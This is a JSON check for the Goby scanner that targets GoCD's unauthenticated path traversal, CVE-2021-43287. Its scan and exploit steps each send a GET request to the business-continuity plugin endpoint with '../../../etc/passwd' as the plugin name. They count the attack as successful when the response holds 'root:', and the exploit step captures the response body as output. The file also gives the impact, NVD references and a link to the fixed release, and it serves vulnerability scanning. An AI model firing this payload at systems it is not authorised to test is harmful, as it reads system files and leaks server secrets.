{
      "Name": "GoCD Unauthorized Path Traversal CVE-2021-43287",
      "Level": "2",
      "Tags": [
            "pathtraversal"
      ],
      "GobyQuery": "body=\"GoCD\"",
      "Description": "GoCD is a continuous delivery server.",
      "Product": "GoCD",
      "Homepage": "https://www.gocd.org/",
      "Author": "",
      "Impact": "An issue was discovered in ThoughtWorks GoCD before 21.3.0. The business continuity add-on, which is enabled by default, leaks all secrets known to the GoCD server to unauthenticated attackers.",
      "Recommendation": "https://www.gocd.org/releases/#21-3-0",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-43287",
            "https://www.gocd.org/releases/#21-3-0"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "root:",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "root:",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|concat|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}